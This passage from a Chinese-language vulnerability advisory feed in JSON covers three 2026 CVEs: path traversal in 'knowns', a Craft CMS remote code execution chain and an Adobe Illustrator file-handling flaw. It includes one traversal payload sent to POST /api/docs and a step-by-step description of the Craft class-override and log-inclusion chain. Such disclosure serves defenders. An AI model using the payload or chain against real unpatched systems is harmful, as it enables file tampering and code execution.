遍历序列，然后，internal/storage/doc_store.go 使用 filepath.Join(ds.docsDir(), filepath.FromSlash(doc.Path)+\".md\") 而不验证解析的路径是否保留在文档目录中。在默认部署中，管理 API 未经身份验证并绑定到所有接口，远程未经身份验证的攻击者可以提供遍历有效负载（例如，向 POST /api/docs 提供 {\"path\": \"../../../../tmp/knowns_pwn_marker\"} ，或向 GET /api/docs/... 提供编码路径），以读取、创建、覆盖或删除主机上任何位置具有 .md 扩展名的任意文件。文件系统并通过 os.MkdirAll 创建任意目录。这可能会暴露其他项目文档中存储的敏感数据，损坏或破坏文件，并提供可能链接到代码执行的任意写入原语。该问题已在 0.30.0 版本中修复。", "effects": [{"comp_name": "knowns", "ecosystem": "linux", "versions": [{"affected_version": "(0,0.30.0)", "min_fixed_version": "0.30.0", "repository": "unmanaged", "solutions": [], "upstream": true}, {"affected_version": "(-∞,0.30.0]", "min_fixed_version": "", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "路径遍历", "kind_en": "对受限制目录的路径名的不正确限制（“路径遍历”）", "last_modified_time": "2026-09-09", "level": "High", "mps_id": "MPS-x7wy-fj2o", "poc": false, "poc_url": [], "published_time": "2026-09-09", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-x7wy-fj2o", "name": "https://www.oscs1024.com/hd/MPS-x7wy-fj2o"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-86775", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-86775"}, {"url": "https://github.com/knowns-dev/knowns/security/advisories/GHSA-3h35-4jq7-hv45", "name": "GitHub Security Advisory (GHSA-3h35-4jq7-hv45)"}, {"url": "https://www.vulncheck.com/advisories/knowns-before-0.30.0-path-traversal-via-document-api", "name": "VulnCheck Advisory: knowns before 0.30.0 Path Traversal via Document API"}], "scope_influence": "", "tags": ["应用软件"], "title": "0.30.0 之前已知通过文档 API 进行路径遍历", "_translated": true, "_saved_at": "2026-09-09T14:58:31+00:00", "_first_saved_at": "2026-09-09T14:58:31+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-x7wy-fj2o"}, {"analysis_status": 0, "articles": [{"content": "应用程序在处理用户输入时的不完善或缺乏验证机制，所以攻击者能够通过向应用程序发送恶意输入，利用应用程序对输入数据的错误处理方式来注入自己的恶意代码。这些恶意代码会被应用程序误认为是合法的指令或数据，并在执行过程中被执行。", "title": "什么是代码注入"}, {"content": "应用程序使用可执行动态代码的函数来执行用户可控的参数，当应用程序对于用户输入过滤不完全时，攻击者可以注入恶意代码并控制代码执行流程。", "title": "代码注入常见的攻击方式"}, {"content": "- 输入验证与过滤：应用程序应该对所有用户输入进行验证和过滤，确保只接受预期的有效输入。这包括对输入数据进行输入长度验证、类型检查和格式验证等。\r\n- 使用参数化查询或预编译语句：对于数据库查询操作，应该使用参数化查询或预编译语句，确保输入数据不会被误认为是执行代码。\r\n- 最小特权原则：应用程序在执行操作系统命令或动态代码时，应该使用最小特权原则，即使用具有最低权限的用户或服务来执行操作。\r\n- 安全编码实践：开发人员应该采用安全编码实践，包括避免使用eval函数、避免拼接用户输入的字符串作为代码执行等。\r\n- 使用Web应用程序防火墙（WAF）：部署Web应用程序防火墙可以帮助检测和阻止代码注入攻击。", "title": "如何预防代码注入"}], "cnvd_id": "", "cve_id": "CVE-2026-86732", "cvss": {"cvssv31": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "severity": "high", "base_score": 8.8}], "cvssv4": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "severity": "high", "base_score": 8.7}]}, "cvss_score": 8.7, "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-94", "description": "Craft CMS 是开源 PHP 内容管理系统，通过 Composer 包 craftcms/cms 发布，用于构建后台可控的网站与内容体验。\n受影响版本中，控制面板 element-index 接口会把请求体中的 criteria 应用到元素查询。ElementHelper::cleanseQueryCriteria() 保留 withTransforms，Component::cleanseConfig() 保留 class，使 criteria[withTransforms][0][class] 进入查询。当资源库查询返回至少一条资产时，eager loader 将其传入 ImageTransforms::normalizeTransform()，PHP 数组展开使后出现的 class 覆盖 Craft::createObject() 的目标类型，攻击者可实例化任意类，并利用 yii\\rbac\\PhpManager 将 itemFile 指向含 User-Agent PHP 载荷的请求日志，在 Web 进程中执行代码。\n修复版本中通过在 ImageTransforms::normalizeTransform() 对数组形态输入拒绝 class 键并抛出 InvalidArgumentException，阻止覆盖对象工厂目标类型，切断任意类实例化与远程代码执行链路。", "effects": [{"comp_name": "craftcms/cms", "ecosystem": "composer", "versions": [{"affected_version": "[5.0.0-RC1,5.10.12)", "min_fixed_version": "5.10.12", "repository": "composer", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "中", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "代码注入", "kind_en": "代码生成控制不当（“代码注入”）", "last_modified_time": "2026-09-08", "level": "High", "mps_id": "MPS-qgoi-xme2", "poc": false, "poc_url": [], "published_time": "2026-09-09", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-qgoi-xme2", "name": "https://www.oscs1024.com/hd/MPS-qgoi-xme2"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-86732", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-86732"}, {"url": "https://github.com/craftcms/cms/security/advisories/GHSA-9wcj-wqqh-cqvg", "name": "GitHub Security Advisory (GHSA-9wcj-wqqh-cqvg)"}, {"url": "https://www.vulncheck.com/advisories/craft-cms-before-5.10.12-remote-code-execution-via-element-index", "name": "VulnCheck Advisory: Craft CMS before 5.10.12 Remote Code Execution via element-index"}], "scope_influence": "", "tags": ["php", "开源"], "title": "Craft CMS远程代码执行", "_translated": true, "_saved_at": "2026-09-08T16:59:21+00:00", "_first_saved_at": "2026-09-08T16:59:21+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-qgoi-xme2"}, {"analysis_status": 0, "articles": [], "cnvd_id": "", "cve_id": "CVE-2026-75991", "cvss": {"cvssv31": [{"source": "psirt@adobe.com", "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H", "severity": "high", "base_score": 8.6}]}, "cvss_score": 8.6, "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H", "cwe": "CWE-20", "description": "Adobe Illustrator 是 Adobe 提供的商业闭源矢量图形设计软件，用于创建和编辑插画、图标、版式及其他矢量文件。\n受影响版本中，Illustrator 对用户打开的文件缺少充分输入校验。攻击者可诱使当前用户打开恶意文件，使不可信文件内容进入危险处理路径，并在当前用户权限上下文中执行任意代码；官方记录同时标明该问题会改变影响范围。\n修复版本中通过官方安全更新加强文件打开路径上的输入校验，阻止恶意文件再触发任意代码执行。Adobe 已在 Illustrator 2025 的 29.8.11 与 Illustrator 2026 的 30.8 中修复该问题。", "effects": [{"comp_name": "illustrator", "ecosystem": "linux", "versions": [{"affected_version": "(-∞,29.8.11)", "min_fixed_version": "29.8.11", "repository": "unmanaged", "solutions": [], "upstream": true}, {"affected_version": "[30.0,30.8)", "min_fixed_version": "30.8", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "中", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "输入验证不恰当", "kind_en": "输入验证不当", "last_modified_time": "2026-09-09", "level": "High", "mps_id": "MPS-1b70-koy3", "poc": false, "poc_url": [], "published_time": "2026-09-09", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-1b70-koy3", "name": "https://www.oscs1024.com/hd/MPS-1b70-koy3"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-75991", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-75991"}, {"url": "https://helpx.adobe.com/security/products/illustrator/apsb26-131.html", "name": ""}], "scope_influence": "", "tags": ["应用软件", "终端软件"], "title":
